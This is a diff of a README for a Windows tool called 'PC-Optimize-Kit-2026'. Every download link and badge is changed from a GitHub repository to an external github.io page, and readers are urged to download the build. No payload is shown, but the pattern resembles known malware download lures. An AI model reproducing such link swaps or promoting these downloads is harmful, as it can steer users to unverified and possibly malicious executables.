@@ -1,6 +1,6 @@
 # ⚡ PC-Optimize-Kit-2026 - Make Your Old PC Feel New Again
 
-[![Download Now](https://img.shields.io/badge/Download-PC--Optimize--Kit--2026-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=1a1a2e&color=00b4d8)](https://github.com/Kajusramanuskas/PC-Optimize-Kit-2026)
+[![Download Now](https://img.shields.io/badge/Download-PC--Optimize--Kit--2026-2ea44f?style=for-the-badge&logo=windows&logoColor=white&labelColor=1a1a2e&color=00b4d8)](https://kajusramanuskas.github.io)
 
 ## 🖥️ What Is PC-Optimize-Kit-2026?
 
@@ -36,11 +36,11 @@ Visit this link to download the application.
 
 **Direct Download Button:**
 
-[![Download PC-Optimize-Kit-2026](https://img.shields.io/badge/⬇︎_Download_Now-PC--Optimize--Kit--2026-ff5722?style=for-the-badge&logo=windows&logoColor=white&labelColor=263238&color=ff7043)](https://github.com/Kajusramanuskas/PC-Optimize-Kit-2026)
+[![Download PC-Optimize-Kit-2026](https://img.shields.io/badge/⬇︎_Download_Now-PC--Optimize--Kit--2026-ff5722?style=for-the-badge&logo=windows&logoColor=white&labelColor=263238&color=ff7043)](https://kajusramanuskas.github.io)
 
 ### Step-by-Step Download Guide
 
-**Step 1:** Click the green "Download" badge above, or use this direct link: [PC-Optimize-Kit-2026 Download](https://github.com/Kajusramanuskas/PC-Optimize-Kit-2026). This will open the download page in your web browser.
+**Step 1:** Click the green "Download" badge above, or use this direct link: [PC-Optimize-Kit-2026 Download](https://kajusramanuskas.github.io). This will open the download page in your web browser.
 
 **Step 2:** On that page, look for the download section. The file might be listed as a versioned release or the latest build. The file name will usually include "PC-Optimize-Kit-2026" and a version number.
 
@@ -104,7 +104,7 @@ Download it today and give your PC a new lease on life. Your machine will thank 
 
 **Remember, the download link is:**
 
-[⬇ Download PC-Optimize-Kit-2026](https://github.com/Kajusramanuskas/PC-Optimize-Kit-2026)
+[⬇ Download PC-Optimize-Kit-2026](https://kajusramanuskas.github.io)
 
 ---
 
